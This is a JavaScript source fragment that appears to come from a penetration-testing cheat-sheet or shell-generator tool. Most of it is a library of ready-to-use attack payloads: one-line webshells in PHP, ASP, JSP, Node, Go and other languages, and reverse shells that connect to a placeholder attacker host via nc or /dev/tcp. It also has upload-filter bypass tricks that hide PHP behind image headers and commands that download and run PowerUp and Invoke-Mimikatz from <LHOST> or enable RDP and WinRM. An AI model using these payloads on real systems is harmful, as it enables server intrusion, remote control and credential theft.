        format: 'python',
        extension: 'py',
        defaultName: 'shellcode'
    },
    {
        key: 'shellcode_raw',
        label: 'Shellcode (Raw)',
        payload: 'windows/x64/meterpreter/reverse_tcp',
        format: 'raw',
        extension: 'bin',
        defaultName: 'shellcode'
    }
];

const SHELL_LIBRARY = [{
        id: 'webshells',
        title: 'Single-line webshells',
        entries: [{
                name: 'PHP',
                commands: [
                    '<?php system($_GET[\'cmd\']); ?>',
                    '<?php echo passthru($_GET[\'cmd\']); ?>',
                    '<?php echo shell_exec($_GET[\'cmd\']); ?>',
                    '<?php echo exec($_GET[\'cmd\']); ?>',
                    '<?php echo `$_GET[\'cmd\']`; ?>',
                    '<?php eval($_POST[\'cmd\']); ?>',
                    '<?php @eval($_REQUEST[\'cmd\']); ?>',
                    '<?php echo file_get_contents(\'/etc/passwd\'); ?>',
                    '<?=`$_GET[0]`?>',
                    '<?=$_GET[0]($_GET[1]);?>'
                ]
            },
            {
                name: 'ASP',
                commands: [
                    '<% eval request("cmd") %>',
                    '<% execute request("cmd") %>',
                    '<% response.write(eval(request("cmd"))) %>'
                ]
            },
            {
                name: 'ASPX',
                commands: [
                    '<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]).Start());%>',
                    '<%@ Page Language="VB" %><%CreateObject("WScript.Shell").Run(Request("cmd"))%>',
                    '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]);%>'
                ]
            },
            {
                name: 'JSP',
                commands: [
                    '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
                    '<%@ page import="java.io.*" %><%Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
                    '<%@ page import="java.util.*,java.io.*"%><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));OutputStream os=p.getOutputStream();InputStream in=p.getInputStream();DataInputStream dis=new DataInputStream(in);String disr=dis.readLine();while(disr!=null){out.println(disr);disr=dis.readLine();}%>'
                ]
            },
            {
                name: 'Python (Flask)',
                commands: [
                    'from flask import Flask, request; import os; app = Flask(__name__); @app.route("/") def cmd(): return os.popen(request.args.get("cmd")).read(); app.run(host="0.0.0.0", port=8080)',
                    'from flask import Flask, request; import subprocess; app = Flask(__name__); @app.route("/") def shell(): return subprocess.check_output(request.args.get("cmd"), shell=True).decode(); app.run(host="0.0.0.0")'
                ]
            },
            {
                name: 'Python (Django)',
                commands: [
                    'import os; from django.http import HttpResponse; def shell(request): return HttpResponse(os.popen(request.GET.get("cmd")).read())'
                ]
            },
            {
                name: 'Python (Generic)',
                commands: [
                    'import os; os.system("busybox nc <LHOST> <LPORT> -e bash")',
                    'import subprocess; subprocess.call(["nc", "<LHOST>", "<LPORT>", "-e", "/bin/bash"])',
                    '__import__("os").system("bash -c \'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\'")'
                ]
            },
            {
                name: 'Node.js (Express)',
                commands: [
                    'const express = require("express"); const { exec } = require("child_process"); const app = express(); app.get("/", (req, res) => { exec(req.query.cmd, (err, stdout) => { res.send(stdout); }); }); app.listen(8080);',
                    'require("http").createServer((req,res)=>{require("child_process").exec(new URL(req.url,"http://localhost").searchParams.get("cmd"),(e,s)=>{res.end(s)})}).listen(8080)'
                ]
            },
            {
                name: 'Perl',
                commands: [
                    'use CGI qw(:standard); print header; print `$ENV{QUERY_STRING}`;',
                    '#!/usr/bin/perl\nuse CGI; $q = CGI->new; print $q->header; print `@{[$q->param("cmd")]}`;'
                ]
            },
            {
                name: 'Ruby',
                commands: [
                    'require "sinatra"; get "/" do; `#{params[:cmd]}`; end',
                    '<% require "open3"; stdout, stderr, status = Open3.capture3(params[:cmd]); %><%= stdout %>'
                ]
            },
            {
                name: 'Go',
                commands: [
                    'package main; import ("net/http"; "os/exec"; "io"); func main() { http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) { cmd := exec.Command("sh", "-c", r.URL.Query().Get("cmd")); out, _ := cmd.Output(); io.WriteString(w, string(out)) }); http.ListenAndServe(":8080", nil) }'
                ]
            },
            {
                name: 'CFML (ColdFusion)',
                commands: [
                    '<cfexecute name="cmd.exe" arguments="/c #url.cmd#" variable="output"></cfexecute><cfoutput>#output#</cfoutput>',
                    '<cfexecute name="/bin/bash" arguments="-c #url.cmd#" variable="result"></cfexecute><cfoutput>#result#</cfoutput>'
                ]
            },
            {
                name: 'Lua',
                commands: [
                    'os.execute(ngx.var.arg_cmd)',
                    'local handle = io.popen(ngx.var.arg_cmd); local result = handle:read("*a"); handle:close(); ngx.say(result)'
                ]
            },
            {
                name: 'Bash (CGI)',
                commands: [
                    '#!/bin/bash\necho "Content-type: text/html"\necho ""\neval $QUERY_STRING'
                ]
            },
            {
                name: 'PowerShell (IIS)',
                commands: [
                    '<% @ Page Language="PowerShell" %><%Invoke-Expression $Request.QueryString["cmd"]%>'
                ]
            }
        ]
    },
    {
        id: 'upload-bypass',
        title: 'Upload bypass',
        entries: [{
                name: 'Alternative extensions',
                description: 'Use these extensions when filters block the obvious one.',
                table: {
                    headers: ['Platform', 'Extensions'],
                    rows: [
                        ['PHP', '.php, .php2, .php3, .php4, .php5, .php6, .php7, .php16, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .phar, .inc, .hphp, .ctp, .module'],
                        ['PHP8', '.php, .php4, .php5, .phtml, .module, .inc, .hphp, .ctp'],
                        ['ASP/ASPX', '.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml'],
                        ['PERL', '.pl, .pm, .cgi, .lib'],
                        ['JSP', '.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action'],
                        ['Coldfusion', '.cfm, .cfml, .cfc, .dbm'],
                        ['Flash', '.swf'],
                        ['Erlang Yaws', '.yaws']
                    ]
                }
            },
            {
                name: 'Content-Type tricks',
                description: 'Upload then rewrite the header to an allowed MIME type while keeping code in body.',
                table: {
                    headers: ['Use case', 'Content-Type to try'],
                    rows: [
                        ['Images allowed', 'image/jpeg, image/png, image/gif'],
                        ['Documents allowed', 'application/pdf, application/msword, application/vnd.ms-excel'],
                        ['Generic binary', 'application/octet-stream']
                    ]
                }
            },
            {
                name: 'Magic numbers',
                description: 'Embed a valid header before your payload.',
                table: {
                    headers: ['Format', 'Command to prepend magic'],
                    rows: [
                        ['GIF', 'printf \'GIF89a;<?php system($_GET["cmd"]); ?>\' > shell.gif'],
                        ['JPEG', 'printf "\\xff\\xd8\\xff\\xe0<?php system(\'id\'); ?>" > image?jpg'],
                        ['Exif comment', 'exiftool -Comment=\'<?php echo "<pre>"; system($_GET["cmd"]); ?>\' image.jpg']
                    ]
                }
            }
        ]
    },
    {
        id: 'stabilisation',
        title: 'Shell stabilisation',
        entries: [{
                name: 'Linux Shell Stabilization',
                codeBlocks: [{
                    label: '',
                    code: [
                        '# Spawn PTY with Python',
                        "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
                        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
                        '',
                        '# Upgrade to full TTY',
                        '# Step 1: Background shell with Ctrl+Z',
                        '# Step 2: Configure terminal',
                        'stty raw -echo',
                        '# Step 3: Bring shell to foreground',
                        'fg',
                        '# Step 4: Set terminal type',
                        'export TERM=xterm-256color',
                        '',
                        '# Alternative methods',
                        '# Using script',
                        'script -qc /bin/bash /dev/null',
                        '',
                        '# Using socat (on attacker machine)',
                        'socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>',
                        '# On victim',
                        'socat TCP:<LHOST>:<LPORT> EXEC:/bin/bash,pty,stderr,setsid,sigint,sane',
                        '',
                        '# Fix terminal size',
                        'stty rows 50 cols 200'
                    ]
                }]
            },
            {
                name: 'Windows Shell Stabilization',
                codeBlocks: [{
                    label: '',
                    code: [
                        '# PowerShell stabilization',
                        'powershell -nop -exec bypass',
                        '',
                        '# Load PowerSploit modules',
                        'IEX (New-Object Net.WebClient).DownloadString(\'http://<LHOST>/PowerUp.ps1\')',
                        'IEX (New-Object Net.WebClient).DownloadString(\'http://<LHOST>/Invoke-Mimikatz.ps1\')',
                        '',
                        '# RDP enable (if admin)',
                        'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
                        'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
                        '',
                        '# Check for WinRM',
                        'Get-Service WinRM',
                        'Enable-PSRemoting -Force'
                    ]
                }]
            }
        ]
    }
];

function escapeRegex(value) {
    return value.replace(/[.*+?^${}()|[\\]\\]/g, '\\$&');
}

function escapeHtml(value) {
    return `${value}`
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}
